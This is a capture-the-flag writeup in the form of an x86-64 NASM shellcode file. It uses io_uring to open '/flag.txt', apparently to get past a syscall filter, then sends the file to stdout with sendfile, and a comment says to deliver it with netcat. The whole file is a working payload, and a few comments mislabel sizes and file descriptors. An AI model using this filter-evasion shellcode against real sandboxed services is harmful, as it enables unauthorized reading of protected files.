BITS 64

; assemble: nasm writeup.asm
; use: nc host port < writeup
; not really optimal shellcode as a PoC, 270 bytes
section .text
global _start

_start:
    ; Allocate buffer for flags via mmap (lazy but I could not care less)
    ; mmap(NULL, 16384, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)  = 0x10000
    mov rax, 9
    mov rdi, 0x10000
    mov rsi, 0x1000
    mov rdx, 3
    mov r10, 0x22
    mov r8, -1
    mov r9, 0
    syscall
    mov r15, rax        ; start of out allocated buffer

    ; io_uring_setup(1, buffer)
    mov rax, 425
    mov rdi, 1 ; entries
    mov rsi, r15 ; params - null array
    syscall
    mov r12, rax        ; save uring fd

    ; Allocate buffer for SQ ring
    mov rax, 9
    mov rdi, 0
    mov rsi, 388
    mov rdx, 3
    mov r10, 0x8001
    mov r8, 3 ; io_uring file
    mov r9, 0 ; 0 - IORING_OFF_SQ_RING
    syscall
    mov r15, rax        ; start of out allocated buffer

    ; SQ ring: increment sq.head
    mov dword [r15 + 4], 1

    ; Allocate buffer for SQE requests
    mov rax, 9
    mov rdi, 0
    mov rsi, 64
    mov rdx, 3
    mov r10, 0x8001
    mov r8, 3 ; io_uring file
    mov r9, 0x10000000 ; IORING_OFF_SQES
    syscall
    mov r15, rax        ; start of out allocated buffer

    ; Prepare SQE at [r15]
    mov dword [r15 + 0x00], 0x12 ; IORING_OP_OPENAT
    mov dword [r15 + 0x04], 0xffffff9c ; AT_FDCWD
    lea r11, [rel flag]                ; "/flag.txt"
    mov [r15 + 0x10], r11

    ; Open file using io_uring
    ; unsigned int fd, u32 to_submit, u32 min_complete, u32 flags, const void *argp, size_t argsz
    ; io_uring_enter(uring_fd, 1, 0, 0, 0)
    mov rax, 426
    mov rdi, r12
    mov rsi, 1
    mov rdx, 0
    mov r10, 0
    mov r8, 0
    mov r9, 8
    syscall

    ; Read flag to stdout
    ; sendfile(1, 3, 0, 256) - push data from fd 4 /flag.txt to fd 1 (stdin), fd 3 was uring_fd
    mov rax, 40
    mov rdi, 1
    mov rsi, 4
    mov rdx, 0
    mov r10, 256
    syscall

    ; exit(0)
    mov rax, 60
    mov rdi, 0
    syscall

flag:
    db "/flag.txt", 0
